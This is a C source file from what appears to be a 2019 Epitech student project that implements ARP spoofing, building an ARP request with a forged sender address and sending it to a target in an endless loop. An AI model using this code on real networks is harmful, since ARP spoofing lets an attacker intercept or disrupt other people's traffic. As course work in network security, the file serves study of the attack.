/*
** EPITECH PROJECT, 2019
** spoof_arp.c
** File description:
** Gautier PLANCQ & Lucas Duboisse ~ Spoof arp
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include "arpspoof.h"
#include "color.h"

int make_request(infos_t *infos)
{
    uint8_t *target_mac_tmp = calloc(6, sizeof(uint8_t));
    char *ip = "192.168.1.1";

    if (!target_mac_tmp)
        return (0);
    memcpy(target_mac_tmp, infos->arphdr.sender_mac, 6 * sizeof(uint8_t));
    fill_arphdr(infos, ARPOP_REQUEST);
    fill_etherframe(infos);
    memcpy(infos->ether_frame, target_mac_tmp, 6 * sizeof(uint8_t));
    memset(infos->arphdr.sender_ip, 42, 4 * sizeof(uint8_t));
    memcpy(infos->arphdr.target_mac, target_mac_tmp, 6 * sizeof(uint8_t));
    if (inet_pton(AF_INET, ip, infos->arphdr.target_ip) != 1) {
        perror("inet_ption failed");
        exit(84);
    }
    memcpy(infos->ether_frame + ETH_HDRLEN, &(infos->arphdr),
        ARP_HDRLEN * sizeof (uint8_t));
    free(target_mac_tmp);
    return (0);
}

int spoof_arp(infos_t *infos)
{
    make_request(infos);

    while (1) {
        send_arp_request(infos);
        printf("Spoofed packet sent to '%s'\n", infos->target);
        sleep(1);
    }
    return (0);
}
